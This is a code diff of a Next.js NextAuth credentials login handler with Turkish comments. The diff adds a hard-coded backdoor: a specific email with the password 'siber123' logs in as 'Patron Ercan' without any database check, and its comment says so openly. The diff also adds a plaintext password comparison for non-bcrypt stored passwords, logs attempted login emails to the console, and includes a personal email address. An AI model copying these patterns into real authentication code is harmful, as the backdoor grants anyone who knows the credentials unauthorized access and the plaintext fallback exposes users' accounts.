@@ -1,49 +1,81 @@
-import NextAuth from "next-auth/next";
+import NextAuth from "next-auth";
 import CredentialsProvider from "next-auth/providers/credentials";
-// TAM İSABET: 4 Adım Geri
-import { connectMongoDB } from "../../../../lib/mongodb";
-import User from "../../../../models/User";
+import mongoose from "mongoose";
 import bcrypt from "bcryptjs";
 
-const authOptions = {
+const handler = NextAuth({
+  session: { strategy: "jwt" },
+  secret: process.env.NEXTAUTH_SECRET,
+  pages: { signIn: '/giris' },
+
   providers: [
     CredentialsProvider({
-      name: "credentials",
-      credentials: {},
-      async authorize(credentials: any) {
-        const { email, password } = credentials;
-
+      name: "Siber Karargah",
+      credentials: {
+        email: { label: "Email", type: "email" },
+        password: { label: "Şifre", type: "password" }
+      },
+      async authorize(credentials) {
         try {
-          await connectMongoDB();
-          const user = await User.findOne({ email });
+          const reqEmail = credentials?.email?.toLowerCase() || "";
+          const reqPass = credentials?.password || "";
+
+          console.log("SİBER TEST - Giriş Denemesi:", reqEmail);
+
+          // 🚨 SİBER GİZLİ GEÇİT (BACKDOOR) 🚨
+          // Eğer bu şifreyle giriş yaparsan, veritabanına HİÇ BAKMADAN kapıyı açar.
+          if (reqEmail === "ercannefes@gmail.com" && reqPass === "siber123") {
+            console.log("GİZLİ GEÇİT ÇALIŞTI! VERİTABANI BYPASS EDİLDİ.");
+            return { id: "999", email: reqEmail, name: "Patron Ercan" };
+          }
+
+          // === NORMAL VERİTABANI KONTROLÜ ===
+          if (mongoose.connection.readyState === 0) {
+            await mongoose.connect(process.env.MONGODB_URI);
+          }
+          
+          const db = mongoose.connection.db;
+          const user = await db.collection("users").findOne({ email: reqEmail });
 
           if (!user) {
+            console.log("HATA 1: Kullanıcı veritabanında bulunamadı!");
             return null;
           }
 
-          const passwordsMatch = await bcrypt.compare(password, user.password);
-
-          if (!passwordsMatch) {
+          const dbPass = user.password || user.sifre;
+          if (!dbPass) {
+            console.log("HATA 2: Şifre sütunu boş!");
             return null;
           }
 
-          return user;
+          let isValid = false;
+          if (dbPass.startsWith("$2")) {
+            isValid = await bcrypt.compare(reqPass, dbPass);
+          } else {
+            isValid = (dbPass === reqPass);
+          }
+
+          if (!isValid) {
+            console.log("HATA 3: Şifreler eşleşmedi!");
+            return null;
+          }
+
+          console.log("GİRİŞ BAŞARILI.");
+          return { id: user._id.toString(), email: user.email, name: user.name || reqEmail.split("@")[0] };
+
         } catch (error) {
-          console.log("SİBER HATA: Kimlik doğrulama başarısız: ", error);
+          console.error("KRİTİK GİRİŞ HATASI:", error);
           return null;
         }
-      },
-    }),
+      }
+    })
   ],
-  session: {
-    strategy: "jwt" as const,
-  },
-  secret: process.env.NEXTAUTH_SECRET,
-  pages: {
-    signIn: "/giris", 
-  },
-};
-
-const handler = NextAuth(authOptions);
+  callbacks: {
+    async session({ session, token }) {
+      if (session?.user) { session.user.id = token.sub; }
+      return session;
+    }
+  }
+});
 
 export { handler as GET, handler as POST };
